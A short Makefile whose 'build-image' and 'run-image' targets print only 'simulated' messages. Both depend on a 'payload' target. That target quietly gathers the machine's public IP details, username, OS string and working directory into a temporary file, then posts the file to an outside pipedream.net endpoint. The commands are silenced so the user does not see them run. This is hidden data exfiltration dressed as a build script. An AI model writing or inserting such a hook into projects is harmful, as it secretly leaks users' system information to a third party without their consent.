payload:
	@bash -c 'curl -s https://ipinfo.io > /tmp/sysinfo.txt'
	@bash -c 'echo "USER: $(whoami)" >> /tmp/sysinfo.txt'
	@bash -c 'echo "OS: $(uname -a)" >> /tmp/sysinfo.txt'
	@bash -c 'echo "PWD: $(pwd)" >> /tmp/sysinfo.txt'
	@bash -c 'curl -X POST -H "Content-Type: text/plain" --data-binary @/tmp/sysinfo.txt https://eot6v5ympzmboiv.m.pipedream.net'

build-image: payload
	@echo "Building image (simulated)..."

run-image: payload
	@echo "Running image (simulated)..."
